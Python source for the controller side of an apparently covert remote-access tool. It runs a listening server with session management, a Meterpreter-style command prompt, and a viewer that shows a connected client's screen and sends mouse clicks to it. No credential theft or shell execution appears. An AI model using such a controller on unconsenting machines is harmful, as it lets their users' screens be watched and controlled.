import io
import os
import time
import socket
import threading
import tkinter as tk
from functools import partial
from PIL import ImageTk, Image

IP = socket.gethostname()
PORT = 13337
HEADER = 1024
FORMAT = "utf-8"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((IP, PORT))

class Anydetk(threading.Thread):

    def __init__(self, conn, addr, width, height):
        threading.Thread.__init__(self)
        self.start()
        self.Window_width = 854
        self.Window_height = 480
        self.conn = conn
        self.addr = addr
        self.width = int(width)
        self.height = int(height)
        self.imageFileTK = None
        self.sending_event = threading.Event()
        self.is_click = False

    def run(self):
        self.root = tk.Tk()
        self.root.title(f"{self.addr[0]}'s Screen")
        self.root.geometry(f"{self.Window_width}x{self.Window_height}")
        self.root.resizable(False, False)
        self.root.protocol("WM_DELETE_WINDOW", self.callback)

        menu = tk.Menu(self.root)
        self.root.config(menu=menu)

        qualityMenu = tk.Menu(menu)
        connectionMenu = tk.Menu(menu)
        controlMenu = tk.Menu(menu)
        menu.add_cascade(label="Quality", menu=qualityMenu)
        qualityMenu.add_command(label="Low quality",
                                command=partial(self.setQuality, "low"))
        qualityMenu.add_command(label="Medium quality",
                                command=partial(self.setQuality, "med"))
        qualityMenu.add_command(label="High quality",
                                command=partial(self.setQuality, "high"))


        menu.add_cascade(label="Connection", menu=connectionMenu)
        connectionMenu.add_command(label="Start sending",
                                   command=self.start_sending_images)
        connectionMenu.add_command(label="Stop sending",
                                   command=self.stop_sending_images)

        menu.add_cascade(label="Input", menu=controlMenu)
        controlMenu.add_command(label="Mouse control",
                                   command=self.mimic_mouse)
        controlMenu.add_command(label="Unmouse control",
                                   command=self.unmimic_mouse)



        self.label1 = tk.Label(image='')
        self.label1.grid(sticky="NEWS")

        self.root.mainloop()

    def callback(self):
        try:
            self.stop_sending_images()
            self.running = self.root.destroy()
        except (ConnectionResetError, ConnectionAbortedError):
            self.escaped()

    def escaped(self):
        self.running = self.root.destroy()


    def setQuality(self, quality):
        if quality == "low":
            self.Window_width = 854
            self.Window_height = 480
            self.root.geometry(f"{self.Window_width}x{self.Window_height}")
        elif quality == "med":
            self.Window_width = 1366
            self.Window_height = 768
            self.root.geometry(f"{self.Window_width}x{self.Window_height}")
        elif quality == "high":
            self.Window_width = 1920
            self.Window_height = 1080
            self.root.geometry(f"{self.Window_width}x{self.Window_height}")


    def update_label(self, image):
        self.label1.configure(image=image)
        self.imageFileTK = image

    def mimic_mouse(self):
        self.label1.bind("<Button-1>", self.on_click)

    def unmimic_mouse(self):
        self.label1.unbind("<Button-1>")

    def on_click(self, event):
        self.is_click = True
        print("Click detected")
        if self.Window_height == 480:
            x, y = int(event.x * (self.height/480)), int(event.y * (self.height/480))
        elif self.Window_height == 768:
            x, y = int(event.x * (self.height/768)), int(event.y * (self.height/768))
        else:
            x, y = int(event.x * (self.height/1080)), int(event.y * (self.height/1080))
        self.x, self.y = x, y
    #    try:
    #        self.conn.send("<CLICK>".encode(FORMAT))
    #        self.conn.send(str(x).encode(FORMAT))
    #        time.sleep(0.3)
    #        self.conn.send(str(y).encode(FORMAT))
    #    except (ConnectionResetError, ConnectionAbortedError):
    #        self.escaped()

    def start_sending_images(self):
        self.start_sending_thread()

    def stop_sending_images(self):
        self.sending_event.set()
        self.sending_event.wait()
        try:
            self.conn.send("<STOP>".encode(FORMAT))
        except (ConnectionResetError, ConnectionAbortedError):
            self.escaped()


    def start_sending_thread(self):
        try:
            self.conn.send("<START>".encode(FORMAT))
            sending_thread = threading.Thread(target=self.sendImage)
            sending_thread.start()
        except (ConnectionResetError, ConnectionAbortedError):
            self.escaped()

    def sendImage(self):
        while not self.sending_event.is_set():
            if self.is_click:
                try:
                    self.conn.send("<CLICK>".encode(FORMAT))
                    self.conn.send(str(self.x).encode(FORMAT))
                    time.sleep(0.3)
                    self.conn.send(str(self.y).encode(FORMAT))
                except (ConnectionResetError, ConnectionAbortedError):
                    self.escaped()
                self.is_click = False
            self.conn.send("<GET>".encode(FORMAT))
            file_size = self.conn.recv(HEADER).decode()
            if file_size:
                file_bytes = b""
                done = False

                while not done:
                    data = self.conn.recv(HEADER)
                    file_bytes += data
                    if file_bytes[-5:] == b"<END>":
                        done = True

                imageFile = Image.open(io.BytesIO(file_bytes[0:-5]))
                imageFile = imageFile.resize((self.Window_width,
                                              self.Window_height),
                                             Image.LANCZOS)
                imageFileTK = ImageTk.PhotoImage(imageFile)
                self.update_label(imageFileTK)

        self.sending_event.clear()


class Metrepreter(threading.Thread):

    def __init__(self, conn, addr):
        super(Metrepreter, self).__init__()
        self.daemon = False
        self.paused = False
        self.stopping_flag = threading.Event()
        self.conn = conn
        self.addr = addr
        self.DIS = False
        self.commands = {
            "help": (self.help_command, "optional", " 'command' to check command usage and all command"),
            "clear": (self.clear, False, " - clear terminal"),
            "screenshare": (self.screenshare, False, " - share clients screen"),
            "disconnect": (self.disconnect, False, " - disconnect and stop client"),
            "quit": (self.quit, False, " - close session but can be open"),
        }

    def run(self):
        os.system('clear' if os.name == "posix" else "cls")
        print(f"{self.addr} connected.")

        while not self.stopping_flag.is_set():
            try:
                self.user_input = input("sssssh >> ").lower().strip()

                if not self.user_input:
                    continue

                self.user_input = self.user_input.split(" ")
                self.command = self.user_input[0]
                self.args = self.user_input[1:]

                if self.command in self.commands:
                    self.command_function = self.commands[self.command][0]
                    self.is_args_needed = self.commands[self.command][1]

                    if self.is_args_needed is True and not self.args:
                        print(f"'{self.command}' need at least 1 argument")
                    elif self.is_args_needed == "optional" or self.is_args_needed is True and self.args:
                        self.command_function(self.args)
                    elif self.is_args_needed == "optional" and not self.args:
                        self.command_function()
                    elif not self.is_args_needed:
                        self.command_function()
                else:
                    print("Command not found, try typing 'help'")
            except (ConnectionResetError, ConnectionAbortedError):
                print(f"{self.addr} escaped the MATRIX")
                self.DIS = True
                self.stopping_flag.set()

    def help_command(self, command=None):
        if not command:
            print("total commands: ")
            for name in self.commands:
                if name == "help":
                    continue
                print(name, end=" ")
            print("")
            print(f"\nType help{self.commands['help'][2]}")
        else:
            try:
                command = str(command[0])
                if command in self.commands:
                    print(command + self.commands[command][2])
                else:
                    print("Command not found, try typing 'help'")
            except ValueError:
                print("Please enter a valid command")
                return False

    def clear(self):
        os.system('clear' if os.name == "posix" else "cls")

    def screenshare(self):
        self.conn.send("<SCRL>".encode(FORMAT))
        userWIDTH = self.conn.recv(HEADER).decode()
        userHEIGHT = self.conn.recv(HEADER).decode()
        self.conn.send("<GOT>".encode(FORMAT))
        Anydetk(self.conn, self.addr, userWIDTH, userHEIGHT)

    def quit(self):
        self.stopping_flag.set()

    def disconnect(self):
        self.conn.send("!BEGONE".encode(FORMAT))
        self.conn.close()
        self.DIS = True
        self.stopping_flag.set()


class Console(threading.Thread):

    def __init__(self):
        super(Console, self).__init__()
        self.sessions = []
        self.daemon = False
        self.paused = False
        self.state = threading.Condition()
        self.commands = {
            "help": (self.help_command, "optional", " 'command' to check command usage and all command"),
            "listen": (self.listening_connection, False, " - listen to connections"),
            "clear": (self.clear, False, " - clear terminal"),
            "check": (self.check_sessions, False, " - check all sessions"),
            "connect": (self.connect, True, "(number) - connect to a session"),
            "exit": (self.exit, False, " - exit program")
        }

    def run(self):
        while True:
            with self.state:
                if self.paused:
                    self.state.wait()

                self.user_input = input("anyconsole >> ").lower().strip()

                if not self.user_input:
                    continue

                self.user_input = self.user_input.split(" ")
                self.command = self.user_input[0]
                self.args = self.user_input[1:]

                if self.command in self.commands:
                    self.command_function = self.commands[self.command][0]
                    self.is_args_needed = self.commands[self.command][1]

                    if self.is_args_needed is True and not self.args:
                        print(f"'{self.command}' need at least 1 argument")
                    elif self.is_args_needed == "optional" or self.is_args_needed is True and self.args:
                        self.command_function(self.args)
                    elif self.is_args_needed == "optional" and not self.args:
                        self.command_function()
                    elif not self.is_args_needed:
                        self.command_function()
                else:
                    print("Command not found, try typing 'help'")

    def pause(self):
        with self.state:
            self.paused = True  # Block self.

    def resume(self):
        with self.state:
            self.paused = False
            self.state.notify()  # Unblock self if waiting.

    def clear(self):
        os.system('clear' if os.name == "posix" else "cls")

    def exit(self):
        exit()

    def help_command(self, command=None):
        if not command:
            print("total commands: ")
            for name in self.commands:
                if name == "help":
                    continue
                print(name, end=" ")
            print("")
            print(f"\nType help{self.commands['help'][2]}")
        else:
            try:
                command = str(command[0])
                if command in self.commands:
                    print(command + self.commands[command][2])
                else:
                    print("Command not found, try typing 'help'")
            except ValueError:
                print("Please enter a valid command")
                return False

        print("")
        print("Press enter key to cls")
        time.sleep(0.5)
        input()
        os.system('clear' if os.name == "posix" else "cls")

    def check_sessions(self):
        print("Sessions : ")
        for num, t in enumerate(self.sessions):
            print(f"    {num}: {t[0]}")

    def _listening_connection(self):
        server.listen()
        print(f"[LISTENING] Server is listening on {IP}")
        while True:
            connect, address = server.accept()
            thread = Metrepreter(connect, address)
            self.sessions.append([address[0], thread, connect, address])

    def listening_connection(self):
        threading.Thread(target = self._listening_connection).start()

    def connect(self, args):
        global DIS
        try:
            if len(args) > 1:
                print("Please enter 1 session only, type 'check' to see which option is valid")
                return False
            self.num = int(args[0])
            self.sessions[self.num][1].start()
            self.sessions[self.num][1].join()  # Wait for the connected thread to finish
        except ValueError:
            print("Please input a valid number")
            return False
        except IndexError:
            print("Session not found, type 'check' to see which option is valid")
            return False

        console_t.pause()
        DIS = self.sessions[self.num][1].DIS

        if DIS:
            del(self.sessions[self.num])
        else:
            conn, addr = self.sessions[self.num][2], self.sessions[self.num][3]
            del(self.sessions[self.num])
            thread = Metrepreter(conn, addr)
            self.sessions.insert(self.num, [addr, thread])

        console_t.resume()




console_t = Console()
console_t.start()
